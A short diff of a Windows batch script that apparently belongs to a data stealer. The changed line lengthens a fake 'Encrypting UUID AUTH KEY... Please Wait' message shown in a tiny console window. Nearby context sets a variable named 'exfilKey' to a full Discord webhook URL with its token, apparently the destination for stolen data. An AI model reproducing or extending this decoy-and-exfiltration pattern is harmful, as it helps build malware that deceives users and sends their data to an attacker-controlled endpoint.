@@ -4,7 +4,7 @@ color 0f
 mode con cols=20 lines=2
 cls
 
-start cmd /c "echo] & echo] & echo     [33m^>  [97mEncrypting UUID AUTH KEY... & timeout /t 10 /nobreak > NUL"
+start cmd /c "echo] & echo] & echo     [33m^>  [97mEncrypting UUID AUTH KEY... & echo] & echo Please Wait... & timeout /t 15 /nobreak > NUL"
 
 :: -- Important Variables --
 set "exfilKey=https://discord.com/api/webhooks/1294342109897162794/qin3QW18hStA0lyK1uluwfVAMWxCyHdoBjqBnTSrYnAeW-2_mm3v94dOihrMUcHuwYrJ"
